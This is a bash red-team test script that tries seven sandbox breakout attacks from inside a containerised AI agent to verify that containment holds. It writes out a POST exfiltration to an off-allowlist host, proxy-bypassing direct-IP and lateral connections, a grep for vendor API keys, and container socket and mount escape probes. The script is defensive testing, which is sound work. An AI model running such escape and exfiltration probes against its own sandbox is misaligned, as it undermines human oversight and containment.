#!/usr/bin/env bash
# =============================================================================
# OpenTrApp Red-Team Breakout  (road-to-recommendable.md §2B, task #54)
# =============================================================================
# The difference between "we built a boundary" and "the boundary holds" is
# actually trying to break out. This drives deliberate escape attempts from a
# COMPROMISED-agent standpoint (threat-model T1/T2/T3/T4) — each MUST be
# contained. A "PASS" here means the attack was BLOCKED; a "BREACH" means it
# succeeded and must be fixed before recommending (CLAUDE.md §11).
#
# This is the active/adversarial complement to tests/boundary-selftest.sh (which
# asserts the boundaries are configured); this one tries to defeat them.
#
# Attacks attempted (from inside vault-agent, the most-exposed container):
#   R1  Host filesystem write — read-only root must reject it          (T1/T4)
#   R2  Credential theft       — no vendor key reachable from the agent (T1)
#   R3  Off-allowlist exfil    — POST to an off-list host → 403         (T1)
#   R4  Direct-IP egress       — IP-literal via proxy → 403; raw → no route (T3)
#   R5  Lateral movement       — reach another workload directly → no route (T2)
#   R6  Escape surface         — no container socket / privilege gain   (T4)
#   R7  DNS rebinding          — partial; needs attacker DNS (SKIP+note) (T3)
#
# Exit:  0 all contained · 1 one or more BREACHES · 2 cannot assess.
#
# Author + lint on the dev box; RUN on capable hardware with the perimeter up.
# For the full §2B pass, also load a deliberately-hostile skill and repeat.
# =============================================================================
set -uo pipefail

AGENT="${OPENTRAPP_AGENT_CTR:-vault-agent}"
PROXY="${OPENTRAPP_PROXY_CTR:-vault-proxy}"
EGRESS="${OPENTRAPP_EGRESS_CTR:-vault-egress}"
OFFLIST_HOST="${OPENTRAPP_OFFLIST_HOST:-example.org}"
PROBE_IP="1.1.1.1"
RUNTIME="${OPENTRAPP_RUNTIME:-}"
JSON=0
for a in "$@"; do case "$a" in
  --json) JSON=1 ;;
  -h | --help) sed -n '2,33p' "$0"; exit 0 ;;
  *) echo "unknown arg: $a" >&2; exit 2 ;;
esac; done

CONTAINED=0; BREACH=0; SKIP=0; BREACHES=""
c_ok=$'\033[32m'; c_no=$'\033[31m'; c_sk=$'\033[33m'; c_z=$'\033[0m'
[ -t 1 ] || { c_ok=""; c_no=""; c_sk=""; c_z=""; }
contained() { CONTAINED=$((CONTAINED + 1)); printf "  ${c_ok}CONTAINED${c_z}  %-18s %s\n" "$1" "${2:-}"; }
breach()    { BREACH=$((BREACH + 1)); BREACHES="$BREACHES $1"; printf "  ${c_no}BREACH!!! ${c_z}  %-18s %s\n" "$1" "${2:-}"; }
noted()     { SKIP=$((SKIP + 1)); printf "  ${c_sk}SKIP/NOTE${c_z}  %-18s %s\n" "$1" "${2:-}"; }

detect_runtime() {
  if [ -n "$RUNTIME" ]; then return 0; fi
  if command -v podman >/dev/null 2>&1; then RUNTIME=podman
  elif command -v docker >/dev/null 2>&1; then RUNTIME=docker
  else echo "ERROR: neither podman nor docker found" >&2; exit 2; fi
}
ctr_running() { $RUNTIME inspect -f '{{.State.Running}}' "$1" 2>/dev/null | grep -qx true; }
xa() { $RUNTIME exec "$AGENT" "$@"; }
# The hardened agent image strips the curl/wget symlinks but keeps busybox, whose
# built-in wget applet still works — detect it (mirrors tests/boundary-selftest.sh),
# else the network attacks R3/R4/R5 silently SKIP on the very image they target.
agent_tool() {
  if xa sh -c 'command -v curl' >/dev/null 2>&1; then echo curl
  elif xa sh -c 'command -v wget' >/dev/null 2>&1; then echo wget
  elif xa sh -c 'command -v busybox >/dev/null 2>&1 && busybox 2>&1 | grep -qw wget'; then echo busybox-wget
  else echo none; fi
}
# Map the detected tool to the wget command (busybox needs the `busybox` prefix).
agent_wget_cmd() { [ "$1" = busybox-wget ] && echo "busybox wget" || echo "wget"; }
# busybox/GNU wget read the *lowercase* http_proxy; the agent sets only uppercase
# HTTP_PROXY (compose), so proxied attempts must bridge it or they bypass the proxy
# and produce a false BREACH. Pull the agent's own configured proxy value.
agent_proxy() { xa sh -c 'printf %s "${HTTP_PROXY:-${http_proxy:-}}"' 2>/dev/null; }

# R1 — Host filesystem write. The agent runs read_only:true; a write outside the
# declared tmpfs mounts must fail. Try to create a file at the container root.
attack_host_write() {
  if xa sh -c 'echo breakout > /opt/opentrapp-redteam-probe 2>/dev/null && echo WROTE' 2>/dev/null | grep -q WROTE; then
    xa sh -c 'rm -f /opt/opentrapp-redteam-probe' 2>/dev/null || true
    breach "R1-host-write" "wrote to read-only root path /opt"
  else
    contained "R1-host-write" "read-only root rejected the write"
  fi
}

# R2 — Credential theft. The vendor API key must not be present in the agent.
attack_cred_theft() {
  local hit
  hit="$(xa env 2>/dev/null | grep -iE '^(ANTHROPIC_API_KEY|OPENAI_API_KEY)=' | grep -vE '=$' || true)"
  if [ -n "$hit" ]; then breach "R2-cred-theft" "vendor key present in agent env"
  else contained "R2-cred-theft" "no vendor key in the agent to steal"; fi
}

# R3 — Off-allowlist exfil. POST data to a host that is NOT on the allowlist;
# the proxy must answer 403 before any upstream connect.
attack_exfil() {
  local tool code wget pxy
  tool="$(agent_tool)"
  if [ "$tool" = none ]; then noted "R3-exfil" "no http tool in agent"; return; fi
  wget="$(agent_wget_cmd "$tool")"; pxy="$(agent_proxy)"
  if [ "$tool" = curl ]; then
    code="$(xa sh -c "http_proxy='$pxy' https_proxy='$pxy' curl -s -o /dev/null -w '%{http_code}' --max-time 8 -X POST --data 'secret=x' http://$OFFLIST_HOST/ 2>/dev/null")"
  else
    code="$(xa sh -c "http_proxy='$pxy' https_proxy='$pxy' $wget -T 8 -S -q -O /dev/null --post-data 'secret=x' http://$OFFLIST_HOST/ 2>&1 | awk '/HTTP\\//{print \$2; exit}'")"
  fi
  if [ "$code" = 403 ]; then contained "R3-exfil" "$OFFLIST_HOST POST → 403"
  else breach "R3-exfil" "$OFFLIST_HOST POST → '${code:-no-response}' (not blocked)"; fi
}

# R4 — Direct-IP egress. (a) IP-literal through the proxy must be rejected (403);
# (b) a proxy-bypassed raw connection must have no route.
attack_direct_ip() {
  local tool code raw wget pxy
  tool="$(agent_tool)"
  if [ "$tool" = none ]; then noted "R4-direct-ip" "no http tool in agent"; return; fi
  wget="$(agent_wget_cmd "$tool")"; pxy="$(agent_proxy)"
  if [ "$tool" = curl ]; then
    code="$(xa sh -c "http_proxy='$pxy' https_proxy='$pxy' curl -s -o /dev/null -w '%{http_code}' --max-time 6 http://$PROBE_IP/ 2>/dev/null")"
    raw="$(xa sh -c "env -u HTTP_PROXY -u HTTPS_PROXY -u http_proxy -u https_proxy curl -s --max-time 6 -o /dev/null -w '%{http_code}' http://$PROBE_IP/ 2>&1; echo \" e=\$?\"")"
  else
    code="$(xa sh -c "http_proxy='$pxy' https_proxy='$pxy' $wget -T 6 -S -q -O /dev/null http://$PROBE_IP/ 2>&1 | awk '/HTTP\\//{print \$2; exit}'")"
    raw="$(xa sh -c "env -u HTTP_PROXY -u HTTPS_PROXY -u http_proxy -u https_proxy $wget -T 6 -q -O /dev/null http://$PROBE_IP/ 2>&1; echo \"e=\$?\"")"
  fi
  if [ "$code" = 403 ]; then contained "R4-ip-proxy" "IP-literal via proxy → 403"
  else breach "R4-ip-proxy" "IP-literal via proxy → '${code:-no-response}'"; fi
  if echo "$raw" | grep -qE 'e=0|^200| 200 '; then breach "R4-ip-raw" "raw route to $PROBE_IP succeeded [$raw]"
  else contained "R4-ip-raw" "no raw route to $PROBE_IP"; fi
}

# R5 — Lateral movement. The agent is on an internal-only net bridged only by the
# proxy; it must not reach another workload or the egress container directly.
attack_lateral() {
  local tool out wget
  tool="$(agent_tool)"
  if [ "$tool" = none ]; then noted "R5-lateral" "no http tool in agent"; return; fi
  wget="$(agent_wget_cmd "$tool")"
  # Try the egress tinyproxy port directly (bypassing the proxy env).
  if [ "$tool" = curl ]; then
    out="$(xa sh -c "env -u HTTP_PROXY -u HTTPS_PROXY -u http_proxy -u https_proxy curl -s --max-time 6 -o /dev/null -w '%{http_code}' http://$EGRESS:8888/ 2>&1; echo \" e=\$?\"")"
  else
    out="$(xa sh -c "env -u HTTP_PROXY -u HTTPS_PROXY -u http_proxy -u https_proxy $wget -T 6 -q -O /dev/null http://$EGRESS:8888/ 2>&1; echo \"e=\$?\"")"
  fi
  if echo "$out" | grep -qE 'e=0|^200|^403| 200 '; then
    breach "R5-lateral" "agent reached $EGRESS:8888 directly [$out]"
  else
    contained "R5-lateral" "no route from agent to $EGRESS (isolated net)"
  fi
}

# R6 — Escape surface. No container runtime socket should be visible, and the
# agent runs no-new-privileges with all caps dropped.
attack_escape_surface() {
  local sock
  sock="$(xa sh -c 'ls /var/run/docker.sock /run/docker.sock /run/podman/podman.sock 2>/dev/null' 2>/dev/null || true)"
  if [ -n "$sock" ]; then breach "R6-escape" "container socket visible: $sock"; return; fi
  # Confirm we cannot mount or gain a new privileged capability (best-effort).
  if xa sh -c 'mount -t tmpfs none /mnt 2>/dev/null && echo MOUNTED' 2>/dev/null | grep -q MOUNTED; then
    breach "R6-escape" "agent could mount a new filesystem (CAP_SYS_ADMIN?)"
  else
    contained "R6-escape" "no container socket; mount denied (caps dropped)"
  fi
}

# R7 — DNS rebinding. Fully exercising this needs an attacker-controlled
# authoritative DNS returning a private IP for an allowlisted name — out of band
# for this script. The L3 egress drop-private set + pinned resolver are the
# mitigations (boundary-selftest B4). Flag as a manual/partial item, not a pass.
attack_dns_rebind() {
  noted "R7-dns-rebind" "needs attacker DNS; verify B4 drop-private + pinned resolver manually (threat-model T3)"
}

detect_runtime
date -u '+%Y-%m-%dT%H:%M:%SZ'
echo "── OpenTrApp red-team breakout ($RUNTIME) ──────────────────────"
missing=""
for c in "$AGENT" "$PROXY" "$EGRESS"; do ctr_running "$c" || missing="$missing $c"; done
if [ -n "$missing" ]; then
  echo "  CANNOT ASSESS — not running:$missing. Bring the perimeter up. Exit 2."
  exit 2
fi
echo
attack_host_write
attack_cred_theft
attack_exfil
attack_direct_ip
attack_lateral
attack_escape_surface
attack_dns_rebind
echo
echo "── result ──────────────────────────────────────────────────"
printf "  contained=%d  BREACH=%d  skip/note=%d\n" "$CONTAINED" "$BREACH" "$SKIP"
[ "$JSON" = 1 ] && printf '{"contained":%d,"breach":%d,"skip":%d,"breaches":"%s"}\n' \
  "$CONTAINED" "$BREACH" "$SKIP" "$(echo "$BREACHES" | xargs)"
if [ "$BREACH" -gt 0 ]; then
  echo "  ${c_no}PERIMETER BREACHED — fix before recommending (§2B).${c_z}"
  exit 1
fi
echo "  ${c_ok}All breakout attempts contained.${c_z}"
[ "$SKIP" -gt 0 ] && echo "  ${c_sk}(note: R7 DNS-rebinding needs a manual/attacker-DNS pass.)${c_z}"
exit 0
